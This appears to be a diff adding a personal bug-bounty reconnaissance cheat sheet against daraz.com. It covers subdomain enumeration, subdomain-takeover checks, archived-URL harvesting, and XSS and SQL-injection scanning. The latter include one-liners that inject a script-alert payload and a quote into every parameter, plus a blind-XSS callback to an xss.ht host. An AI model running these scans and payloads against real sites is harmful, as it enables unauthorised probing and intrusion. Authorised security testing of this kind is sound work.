@@ -1,0 +1,72 @@
+###Subdomain enumeration
+#sublist3r
+	sublist3r -d daraz.com
+	sublist3r -active -brute -d daraz.com 
+#subfinder
+	subfinder -d daraz.com
+	subfinder -d daraz.com -recursive -silent -t 200 -v 
+#assetfinder
+	assetfinder -d daraz.com
+#amass
+	amass enum -d daraz.com
+	amass enum -active -brute -d daraz.com
+	amass intel -whois -d daraz.com
+#subdomainer.c99.nl
+#subbrute-bruteforcing
+	python3 subbrute.py daraz.com 
+#FFUF
+	ffuf -u "https://FUZZ.daraz.com.np" -w /home/ujjwal/hack/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -v | grep "| URL |" | awk '{print $4}' | sed 's/^http[s]:\/\///g'
+	ffuf -u "https://FUZZ.daraz.com" -w /home/ujjwal/hack/SecLists/Discovery/DNS/shubs-subdomains.txt -v | grep "| URL |" | awk '{print $4}' | sed 's/^http[s]:\/\///g'
+	ffuf -u "https://FUZZ.daraz.com" -w /home/ujjwal/hack/SecLists/Discovery/DNS/bestDnsWordlist.txt -v | grep "| URL |" | awk '{print $4}' | sed 's/^http[s]:\/\///g'
+#crt.sh
+	curl -s "https://crt.sh/?q=%.daraz.com.np&output=json" | jq '.[].name_value' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u
+#findomain
+	findomain -t daraz.com
+#knockpy
+	p knockpy,py daraz.com
+#massdns(after getting all subdomains-including offline)
+	./bin/massdns -r lists/resolvers.txt  -t A /home/ujjwal/all.txt > massdns.txt
+	cat massdns.out | awk '{print $1}' | sed 's/.$//' | sort -u > hosts-online.txt
+------------------------------**************************************-----------------------------------------------------------	
+
+
+ ###subdomain-takeover
+ #Subzy
+ 	subzy -targets file.txt
+ #subjack
+	subjack -w /home/ujjwal/darazRecon/all.txt -c /home/ujjwal/go/pkg/mod/github.com/haccer/subjack@v0.0.0-20201112041112-49c51e57deab/fingerprints.json
+	subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt -ssl
+
+---------------------------------------*****************************---------------------------------------------------------------------
+
+
+#waybackurls(first do for main-domain, then try with other important domain and then with all other subdomains):
+ 	waybackurls domain.com (shows for both domain and sub-domains)
+ 	cat domains-list.txt | waybackurls (for list of domains)
+ 	echo "domain.com" | waybackurls -no-subs (only works for main domain and not sub-domain)
+ 	cat waybackurls.txt | httpx | anew live.txt
+ 	
+ 	
+#gau(works only for main domain, so send all subdomains)
+ 	gau domain.com
+ 	cat sub-domains.txt | gau --threads 10
+	cat gau.txt | httpx | anew live.txt
+
+
+ #gf, dalfox tool(we dont have to use grep, because gf is collection of complex grep commands)
+ 	#xss
+ 	cat live.txt | gf xss | sed 's/=.*/=/' | sort -u | tee Possible_xss.txt && cat Possible_xss.txt | dalfox pipe > output-xss.txt
+ 	#blind xss:		
+ 	cat live.txt | gf xss | sed 's/=.*/=/' | sort -u | tee Possible_blind_xss.txt && cat Possible_blind_xss.txt | dalfox -b ujjwal.xss.ht pipe > output-blind-xss.txt
+ 	#reflected xss: 	
+ 	cat live.txt | grep '=' | qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
+ 	#sqli
+ 	cat live.txt | gf sqli | qsreplace "'" | while read host do; do curl --silent --insecure $host | egrep -qs "(mysql_fetch_array|SQL syntax)" && echo "possible sql injection here $host" ; done
+
+ 	
+ 	
+ 	
+ 	
+--------------------------------------****************************---------------------------------------------------------------------------------------- 
+ 
+
